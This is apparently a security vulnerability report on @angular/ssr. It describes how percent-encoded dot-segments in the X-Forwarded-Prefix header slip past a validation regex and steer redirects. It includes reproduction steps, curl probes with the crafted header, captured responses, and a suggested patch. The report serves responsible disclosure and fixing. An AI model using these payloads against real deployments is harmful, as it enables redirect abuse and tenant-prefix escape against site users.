# @angular/ssr - `X-Forwarded-Prefix` encoded dot-segment path traversal in redirect Location

**Product:** @angular/ssr
**Repository:** https://github.com/angular/angular-cli
**Component:**
- `packages/angular/ssr/src/utils/validation.ts:32` (`INVALID_PREFIX_REGEX`)
- `packages/angular/ssr/src/utils/validation.ts:108-112` (prefix sanitization in `cloneRequestAndPatchHeaders`)
- `packages/angular/ssr/src/app.ts:195` (`joinUrlParts(prefix, buildPathWithParams(...))`)
- `packages/angular/ssr/src/utils/redirect.ts:64` (`createRedirectResponse`)

**Version:** 21.2.8 (latest stable on npm at time of writing). Tested against local checkout commit `012239817487fbd3a404ced3bbf7b8dcbda2ff02` on `main`.
**Type:** CWE-601 (URL Redirection to Untrusted Site / Open Redirect), CWE-20 (Improper Input Validation)
**CVSS 3.1:** 5.3 (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`)

## Description

`@angular/ssr` validates the `X-Forwarded-Prefix` header to prevent path traversal in the reconstructed base path. `INVALID_PREFIX_REGEX = /^(?:\\|\/[/\\])|(?:^|[/\\])\.\.?(?:[/\\]|$)/` rejects headers whose **raw** bytes contain `.` / `..` path segments or multiple leading slashes. However, the regex is applied to the un-decoded header string, while downstream consumers — and every WHATWG-compliant HTTP client (Chromium, Firefox, Safari, `node:fetch`) — normalize percent-encoded dot-segments (`%2e%2e`) when resolving the `Location` header.

`cloneRequestAndPatchHeaders` (`validation.ts:108-112`) strips leading slashes but does not decode the prefix:

```ts
const xForwardedPrefix = getFirstHeaderValue(headers.get('x-forwarded-prefix'));
if (xForwardedPrefix !== undefined) {
  headers.set('x-forwarded-prefix', xForwardedPrefix.replace(/^\/+/, ''));
}
```

The prefix then reaches `AngularServerApp.render()` which builds the final redirect path via `joinUrlParts(prefix, buildPathWithParams(...))` (`app.ts:195`), and `createRedirectResponse` emits the string as-is into the `Location` response header (`redirect.ts:64`). No decode-normalize-revalidate step exists between validation and the sink.

On the receiving browser, `new URL('/foo/%2e%2e/bar/home', location).pathname` becomes `/bar/home`. Prefix containment is lost after the header has already passed validation. The attacker controls the leading prefix component but crucially also controls the post-traversal target, so `/foo-<attacker>/%2e%2e/<attacker-target>/<legit-route>` collapses to `/<attacker-target>/<legit-route>` in the client.

```ts
// packages/angular/ssr/src/utils/validation.ts:32
const INVALID_PREFIX_REGEX = /^(?:\\|\/[/\\])|(?:^|[/\\])\.\.?(?:[/\\]|$)/;
```

The regex is pattern-matching on literal dots. `%2e%2e` is not matched. The gap is in the abstraction boundary: the validator reasons about header bytes, the browser reasons about parsed paths.

The gap is distinct from CVE-2025-62427 (PR #31474, path hijack), from CVE-2026-27739 (PR #32516, forwarded header validation, introduced `INVALID_PREFIX_REGEX`), and from the three previously filed SSRF findings by the same reporter (X-Forwarded-Host port-pivot, comma-smuggling, HTTP/2 `:authority`). PR #32516 introduced the exact regex that fails to decode; no prior fix has addressed encoded dot-segments in this header.

## Impact

An unauthenticated remote request with `X-Forwarded-Prefix: foo/%2e%2e/bar` causes the application's redirect handlers to emit a `Location` header whose post-browser-normalization target is `/bar/...`. When the attacker controls the path component after `%2e%2e`, the browser redirects to an attacker-chosen path within the origin.

Reachability: any SSR route configured with `redirectTo:` (canonical router pattern, see Angular Router docs). The scaffold's default `/go → /home` redirect is sufficient.

Practical consequences on a typical deployment:

- **Internal phishing / UI redress**: attacker-controlled first-click redirect on the legitimate origin sends users to an in-origin path that the deployer did not intend to route through prefix-forwarded redirects. Useful as a stepping stone for OAuth callback manipulation (redirect to a route that accepts returned tokens), session-fixation flows, or rendering a crafted path under the origin's privileges.
- **Prefix-containment bypass in multi-tenant deployments**: deployers use `X-Forwarded-Prefix` exactly to scope a tenant/app to a subpath. An `%2e%2e` prefix escapes the subpath mount point, so content under tenant A's mount point can be served from tenant B's path.
- **Chained with an XSS or an open-redirect in the redirected path**: the attacker controls the final path, which means any existing vulnerability at `/bar/...` is reachable via a shareable link that visually looks like `/go` on the origin.

CVSS impact is rated I:L (limited integrity impact on navigation) and C:N (I did not prove a direct confidentiality leak; the confidentiality angle depends on the downstream route the attacker redirects to).

## Steps to Reproduce

Tested with Node.js 25. Under 5 minutes end to end.

### 1. Scaffold

```bash
cd /tmp
npx -y -p @angular/cli@21.2.8 ng new xfp-traversal --ssr --routing=true --style=css --skip-git --skip-install
cd xfp-traversal
npm install
```

### 2. Configure allowlist for the test origin

In `angular.json`, under `projects.xfp-traversal.architect.build.options`:

```json
"security": { "allowedHosts": ["example.com"] }
```

### 3. Switch to per-request SSR

Replace `src/app/app.routes.server.ts`:

```ts
import { RenderMode, ServerRoute } from '@angular/ssr';

export const serverRoutes: ServerRoute[] = [
  { path: '**', renderMode: RenderMode.Server },
];
```

### 4. Add a redirect route (canonical Angular Router pattern)

`src/app/home.component.ts`:

```ts
import { Component } from '@angular/core';

@Component({
  selector: 'app-home',
  standalone: true,
  template: '<main id="home">home-ok</main>',
})
export class HomeComponent {}
```

`src/app/app.routes.ts`:

```ts
import { Routes } from '@angular/router';
import { HomeComponent } from './home.component';

export const routes: Routes = [
  { path: 'home', component: HomeComponent },
  { path: 'go', redirectTo: 'home', pathMatch: 'full' },
  { path: '', pathMatch: 'full', redirectTo: 'home' },
];
```

### 5. Build and run the canonical server

```bash
npx ng build
PORT=4300 node dist/xfp-traversal/server/server.mjs &
```

### 6. Three-probe isolation

```bash
# A. Baseline. Normal prefix forwarded as Location.
curl -si http://127.0.0.1:4300/go \
  -H 'Host: example.com' -H 'X-Forwarded-Prefix: /safe'
# Expected: 302, location: /safe/home

# B. Exploit. Encoded dot-segments bypass INVALID_PREFIX_REGEX.
curl -si http://127.0.0.1:4300/go \
  -H 'Host: example.com' -H 'X-Forwarded-Prefix: foo/%2e%2e/bar'
# Expected: 302, location: /foo/%2e%2e/bar/home
# After browser normalization of the Location value: /bar/home

# C. Control. Literal dot-segments are correctly rejected.
curl -si http://127.0.0.1:4300/go \
  -H 'Host: example.com' -H 'X-Forwarded-Prefix: foo/../bar'
# Expected: 400, 'Header "x-forwarded-prefix" must not start with "\" or multiple "/" or contain ".", ".." path segments.'
```

Chromium replay confirms the browser-side normalization (the traversal is not only in the header string; it completes at the client):

```bash
# Stand up a tiny local redirector that replays the Location into the browser
# (detailed in poc/README.md), then:
'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' \
  --headless=new --disable-gpu --virtual-time-budget=4000 \
  --dump-dom http://127.0.0.1:4311/start
# Observed DOM body: <main>bar-home</main> — browser landed at /bar/home.
```

## Proof of Concept

The PoC is the scaffold above with four minimal edits (routes and allowlist only). No custom bootstrap, no middleware, no private imports.

## Evidence

Captured in the companion archive (`evidence/01-baseline.txt`, `02-exploit-pct2e.txt`, `03-control-dotdot.txt`). Secrets are timestamped to make replay evidence non-forgeable.

Baseline (`evidence/01-baseline.txt`):
```
HTTP/1.1 302 Found
location: /safe-1777049159/home
```

Exploit (`evidence/02-exploit-pct2e.txt`):
```
HTTP/1.1 302 Found
location: /foo-1777049159/%2e%2e/bar/home
```

Control (`evidence/03-control-dotdot.txt`):
```
HTTP/1.1 400 Bad Request
Header "x-forwarded-prefix" must not start with "\" or multiple "/" or contain ".", ".." path segments.
```

The exploit's `Location` value is emitted verbatim. Browser normalization to `/bar/home` is independently demonstrated by the Chromium replay in `WALKTHROUGH.md` § 6.

## Suggested Fix

Decode and canonicalize `X-Forwarded-Prefix` before validation, and reject if the decoded path re-introduces dot-segments, encoded separators, or differs from its re-serialized form.

```ts
// packages/angular/ssr/src/utils/validation.ts (inside validateHeaders)
const xForwardedPrefix = getFirstHeaderValue(headers.get('x-forwarded-prefix'));
if (xForwardedPrefix !== undefined) {
  let decoded: string;
  try {
    decoded = decodeURIComponent(xForwardedPrefix);
  } catch {
    throw new Error('Header "x-forwarded-prefix" contains invalid percent-encoding.');
  }
  if (decoded !== xForwardedPrefix || INVALID_PREFIX_REGEX.test(decoded) || decoded.includes('\\')) {
    throw new Error(
      'Header "x-forwarded-prefix" must not start with "\\" or multiple "/" or contain ".", ".." path segments (encoded or not).'
    );
  }
}
```

Alternative (simpler, higher-friction): reject any `%` in `X-Forwarded-Prefix` unless `@angular/ssr` explicitly documents encoded prefixes as a supported configuration.

## Relation to prior findings

Distinct from the three filed SSRF findings (X-Forwarded-Host port-pivot, comma-smuggling, HTTP/2 `:authority`). This one targets `X-Forwarded-Prefix` and the redirect sink, not the host-reconstruction path. The fix is in validation's prefix handler, not in `isHostAllowed` or the pseudo-header scope set.
